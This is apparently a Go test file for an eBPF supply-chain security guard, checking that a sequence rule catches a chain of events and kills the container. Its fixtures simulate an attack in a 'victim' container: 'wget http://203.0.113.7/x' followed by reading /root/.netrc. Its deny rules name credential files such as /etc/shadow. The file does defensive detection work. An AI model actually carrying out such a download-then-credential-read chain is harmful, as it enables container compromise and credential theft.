package pipeline

import (
	"context"
	"errors"
	"fmt"
	"testing"
	"time"

	"github.com/DevLSJ/ebpf-supplychain-guard/backend/internal/enforcer"
	"github.com/DevLSJ/ebpf-supplychain-guard/backend/internal/model"
	"github.com/DevLSJ/ebpf-supplychain-guard/backend/internal/rules"
)

// 연쇄 규칙(kind: sequence, 11/03) — 파이프라인은 Observe 로 평가하고, 컨테이너가 끝나거나 격리되면 Forget 한다.

var seqT0 = time.Date(2026, 11, 3, 9, 0, 0, 0, time.UTC)

func chainRule(dry bool) rules.Rule {
	return rules.Rule{ID: "chain", Kind: model.KindSequence, Action: model.ActionKill, DryRun: dry, WindowSeconds: 10, Steps: []rules.Rule{
		{Kind: model.KindExec, DenyComms: []string{"wget"}},
		{Kind: model.KindConnect, AllowCIDRs: []string{"10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16", "127.0.0.0/8"}},
		{Kind: model.KindOpen, DenyPaths: []string{"/root/.netrc"}},
	}}
}

// seqPipe: 연쇄 규칙 + 주어진 단일 규칙으로 엔진을 바꾼 파이프라인
func seqPipe(t *testing.T, opt Options, enf *fakeEnforcer, rs ...rules.Rule) (*Pipeline, *fakeHub) {
	t.Helper()
	p, hub := newPipe(t, opt, enf)
	p.engine = rules.New(rs)
	return p, hub
}

func seqEvents(start float64) []model.Event {
	at := func(s float64) time.Time { return seqT0.Add(time.Duration((start + s) * float64(time.Second))) }
	return []model.Event{
		{Kind: model.KindExec, Timestamp: at(0), ContainerID: cid, ContainerName: "victim", Comm: "wget", Pid: 5, Args: "wget http://203.0.113.7/x"},
		{Kind: model.KindConnect, Timestamp: at(1), ContainerID: cid, ContainerName: "victim", Comm: "wget", Pid: 5, DstIP: "203.0.113.7", DstPort: 80, DNSTraced: false},
		{Kind: model.KindOpen, Timestamp: at(2), ContainerID: cid, ContainerName: "victim", Comm: "python", Pid: 7, Path: "/root/.netrc"},
	}
}

func handleAll(p *Pipeline, evs ...model.Event) {
	for _, ev := range evs {
		p.Handle(context.Background(), ev)
	}
}

func TestPipelineSequenceKill(t *testing.T) {
	enf := &fakeEnforcer{}
	p, hub := seqPipe(t, Options{EnforceKill: true}, enf, chainRule(false))
	handleAll(p, seqEvents(0)...)
	if len(enf.calls) != 1 || enf.calls[0] != cid {
		t.Fatalf("sequence kill must call Kill once, calls=%v", enf.calls)
	}
	msgs := hub.snapshot()
	if len(msgs) != 3 || msgs[0].Matched || msgs[1].Matched {
		t.Fatalf("first two steps are normal events, got %+v", msgs)
	}
	v := msgs[2]
	if !v.Matched || v.RuleID != "chain" || v.Action != model.ActionKill || !v.Enforced || v.Sequence == nil || len(v.Sequence.Steps) != 3 {
		t.Fatalf("sequence verdict: %+v", v)
	}
	if v.Timeline == nil || v.Timeline.KilledAt == nil || !v.Timeline.DetectedAt.Equal(seqT0.Add(2*time.Second)) {
		t.Fatalf("timeline: %+v", v.Timeline)
	}
}

// 이벤트 1개 = 판정 1건 = enforce 최대 1회: 같은 이벤트에 단일 규칙(kill)과 연쇄(kill)가 함께 걸려도 Kill 은 한 번
func TestPipelineSequenceAndSingleRuleOneKill(t *testing.T) {
	enf := &fakeEnforcer{}
	single := rules.Rule{ID: "netrc", Kind: model.KindOpen, Action: model.ActionKill, DenyPaths: []string{"/root/.netrc"}}
	p, hub := seqPipe(t, Options{EnforceKill: true}, enf, chainRule(false), single)
	handleAll(p, seqEvents(0)...)
	if len(enf.calls) != 1 {
		t.Fatalf("one event, one kill: calls=%v", enf.calls)
	}
	msgs := hub.snapshot()
	if len(msgs) != 3 {
		t.Fatalf("one verdict per event, got %d", len(msgs))
	}
	if v := msgs[2]; v.RuleID != "netrc" || !v.Enforced || v.Sequence == nil || v.Sequence.RuleID != "chain" {
		t.Fatalf("tie → single rule verdict with the sequence attached: %+v", v)
	}
}

func TestPipelineSequenceGlobalDryRun(t *testing.T) {
	enf := &fakeEnforcer{}
	p, hub := seqPipe(t, Options{EnforceKill: false}, enf, chainRule(false))
	handleAll(p, seqEvents(0)...)
	if len(enf.calls) != 0 {
		t.Fatal("ENFORCE_KILL=false must not kill")
	}
	if v := hub.snapshot()[2]; v.RuleID != "chain" || !v.DryRun || v.Enforced || v.Sequence == nil {
		t.Fatalf("want dry-run sequence verdict, got %+v", v)
	}
	// 규칙 dryRun 도 격리하지 않는다
	p, hub = seqPipe(t, Options{EnforceKill: true}, enf, chainRule(true))
	handleAll(p, seqEvents(0)...)
	if v := hub.snapshot()[2]; len(enf.calls) != 0 || v.RuleID != "chain" || !v.DryRun || v.Enforced {
		t.Fatalf("rule dry-run: calls=%v %+v", enf.calls, v)
	}
}

// 컨테이너 종료(exit) 때 연쇄 상태를 버린다 — 설치 세션 추적(review)이 없어도
func TestPipelineSequenceForgetOnExit(t *testing.T) {
	for _, withReview := range []bool{false, true} {
		t.Run(fmt.Sprintf("review=%v", withReview), func(t *testing.T) {
			evs := seqEvents(0)
			// 대조: 종료가 없으면 걸린다
			p, hub := seqPipe(t, Options{EnforceKill: false}, &fakeEnforcer{}, chainRule(false))
			if withReview {
				p.SetReview(&fakeReviewer{})
			}
			handleAll(p, evs...)
			if v := hub.snapshot()[2]; v.RuleID != "chain" {
				t.Fatalf("control: %+v", v)
			}
			// 같은 ID 의 컨테이너가 두 단계 뒤 끝났다 → 다음 open 은 연쇄가 아니다
			p, hub = seqPipe(t, Options{EnforceKill: false}, &fakeEnforcer{}, chainRule(false))
			if withReview {
				p.SetReview(&fakeReviewer{})
			}
			exit := model.Event{Kind: model.KindExit, Timestamp: seqT0.Add(1500 * time.Millisecond), ContainerID: cid, ContainerName: "victim"}
			handleAll(p, evs[0], evs[1], exit, evs[2])
			if v := hub.snapshot()[2]; v.Matched || v.Sequence != nil {
				t.Fatalf("exit must forget the chain: %+v", v)
			}
		})
	}
}

// 격리 성공 · 이미 멈춤(NotRunning · NotFound) 때도 상태를 버린다. 다른 kill 실패는 컨테이너가 살아 있을 수 있어 남긴다
func TestPipelineSequenceForgetAfterKill(t *testing.T) {
	shadow := rules.Rule{ID: "shadow", Kind: model.KindOpen, Action: model.ActionKill, DenyPaths: []string{"/etc/shadow"}}
	cases := []struct {
		name   string
		err    error
		forget bool
	}{
		{"kill ok", nil, true},
		{"not running", fmt.Errorf("x: %w", enforcer.ErrNotRunning), true},
		{"not found", fmt.Errorf("x: %w", enforcer.ErrNotFound), true},
		{"other failure", errors.New("socket unavailable"), false},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			enf := &fakeEnforcer{err: c.err}
			p, hub := seqPipe(t, Options{EnforceKill: true}, enf, chainRule(true), shadow)
			evs := seqEvents(0)
			kill := evs[2]
			kill.Path = "/etc/shadow" // 단일 규칙 kill — 연쇄 단계는 아니다
			kill.Timestamp = seqT0.Add(1500 * time.Millisecond)
			handleAll(p, evs[0], evs[1], kill, evs[2])
			msgs := hub.snapshot()
			if len(enf.calls) != 1 || msgs[2].RuleID != "shadow" {
				t.Fatalf("single-rule kill: calls=%v %+v", enf.calls, msgs[2])
			}
			got := msgs[3].Sequence != nil
			if got == c.forget {
				t.Fatalf("forget=%v but sequence fired=%v: %+v", c.forget, got, msgs[3])
			}
		})
	}
}
